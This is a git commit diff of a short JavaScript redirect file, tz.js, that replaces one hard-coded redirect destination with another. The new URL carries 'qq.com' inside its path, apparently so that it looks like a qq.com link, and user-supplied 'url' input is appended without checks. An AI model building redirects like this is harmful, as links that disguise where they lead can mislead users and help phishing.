106acf5e4969ec07d686381565acfdb9d0e46905
xcz789 <2644987@qq.com>
2024-07-05 16:38:56 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://static.ylxweb.com/upload/xinyue/2024/17203.html";
+let redirectURL = "https://v1.ingqu.com//home/http://qq.com/,w124.html";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
